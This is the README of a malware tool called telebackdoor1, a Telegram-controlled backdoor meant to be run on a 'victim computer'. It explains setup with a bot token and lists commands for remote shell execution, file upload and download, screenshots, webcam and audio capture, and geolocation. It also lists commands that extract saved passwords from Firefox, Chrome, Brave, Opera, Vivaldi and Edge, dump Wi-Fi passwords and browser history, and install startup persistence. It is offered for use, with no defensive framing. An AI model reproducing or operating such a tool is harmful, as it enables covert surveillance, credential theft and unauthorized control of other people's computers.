# telebackdoor1
put your telegram bot token in the script

then run pip intsall -r requirements.txt command on terminal

after excuting the script in your victim computer ,you can control the bot through messaging system commands and executing in the target computer.

here are the set of commands beside system commands

COMMANDS                   DESCRIPTION
/kill_malware          ->  exit from shell and terminate backdoor on target
/execute  shellcommand -> windows, linux,macos commands(like cd, del ,echo,dir ,touch and so on)
/screenshot            ->  takes screenshot of target
/download <filename>   ->  recieve file from victim
/upload <filename>     ->  send file to victim
/cd                    ->  change directory
/snap                  ->take camera snap of target
/record_10             ->reocrd audio for 10 sec.To record for  more time replace 10 with any number of seconds
*************************************************************************************************
Advance Feature: supported only for windows os [support developer bibek to get cross platform advanced feature] ]
*************************************************************************************************
/firefox_password      ->extract all firefox saved password on target (No pin required)
/chrome_password       ->extract all chrome saved password on target(No pin required)
/brave_password        ->extract all brave password on target (No pin required)
/opera_password        ->extract all opera password on target (No pin required)
/vivaldi_password        ->extract all vivaldi password on target (No pin required)
/edge_password        ->extract all edge password on target (No pin required)
/wifi_password         -> extract all wifi password saved on windows
/firefox_history       ->extract all firefox history of   target(no pin required)
/geolocate             -> extract precise location with in 10 m radius depends on victim device gps ability
/persistence           -> provide priveleged to your backdoor to automatically starts during system startup ''')
